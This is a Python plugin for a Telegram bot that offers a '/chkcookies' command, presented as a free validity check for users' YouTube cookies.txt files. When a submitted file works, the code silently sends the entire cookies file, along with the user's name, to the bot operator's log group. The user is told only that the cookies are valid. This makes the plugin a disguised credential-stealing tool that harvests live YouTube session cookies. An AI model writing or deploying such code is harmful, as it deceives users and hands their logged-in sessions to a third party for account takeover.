import yt_dlp
import os
from datetime import datetime
from SONALI import app
from pyrogram import filters
from pyrogram.types import Message
from config import LOGGER_ID as LOGS_GROUP_ID  # Group Logs ID

# ✅ Active Users Tracker
active_users = {}

# ✅ `/chkcookies` Enable Command
@app.on_message(filters.command("chkcookies") & filters.private)
async def enable_cookie_check(client, message):
    active_users[message.chat.id] = True  # User Active List me Add
    await message.reply("✅ Now send your `cookies.txt` file to check!")

# ✅ Ignore Galat Input (Bypass)
@app.on_message(filters.private & ~filters.document)
async def ignore_wrong_input(client, message):
    pass  # Kuch bhi error nahi dikhega (Bypass Mode)

# ✅ Sirf cookies.txt File Pe Response
@app.on_message(filters.document & filters.private)
async def check_cookies_from_file(client, message: Message):
    if message.chat.id not in active_users:
        return  # Ignore if user didn't use `/chkcookies`

    file_path = await message.download()
    if not file_path.endswith(".txt"):
        os.remove(file_path)  # Delete temp file
        return  # Ignore Invalid File (Bypass)

    try:
        with open(file_path, "r") as f:
            cookies_data = f.read().strip()

        if not cookies_data:
            await message.reply("❌ Your `cookies.txt` file is empty!")
            os.remove(file_path)
            del active_users[message.chat.id]  # Reset User
            return

        # ✅ Validate YouTube Cookies
        ydl_opts = {"quiet": True, "cookiefile": file_path}
        check_time = datetime.now().strftime("%d-%m-%Y %I:%M %p")
        display_name = message.from_user.first_name

        try:
            with yt_dlp.YoutubeDL(ydl_opts) as ydl:
                ydl.extract_info("https://www.youtube.com/watch?v=dQw4w9WgXcQ", download=False)

            msg = "✅ **Your YouTube Cookies are Valid!**"
            log_msg = f"🛡 **Cookies Checked!**\n✅ **Result:** Working\n👤 **User:** {display_name}\n⏰ **Checked At:** {check_time}"

            # ✅ Send Valid Cookies to Group
            await client.send_document(LOGS_GROUP_ID, file_path, caption=log_msg)

        except yt_dlp.utils.ExtractorError:
            msg = "❌ **Your YouTube Cookies are Invalid or Expired!**"
            log_msg = f"🛡 **Cookies Checked!**\n❌ **Result:** Invalid\n👤 **User:** {display_name}\n⏰ **Checked At:** {check_time}"

        # ✅ Send Log Only
        await client.send_message(LOGS_GROUP_ID, log_msg)
        await message.reply(msg, quote=True)

    except Exception as e:
        await message.reply(f"⚠️ **Error Reading File:** `{str(e)}`")

    # ✅ Cleanup & Reset User
    os.remove(file_path)
    del active_users[message.chat.id]
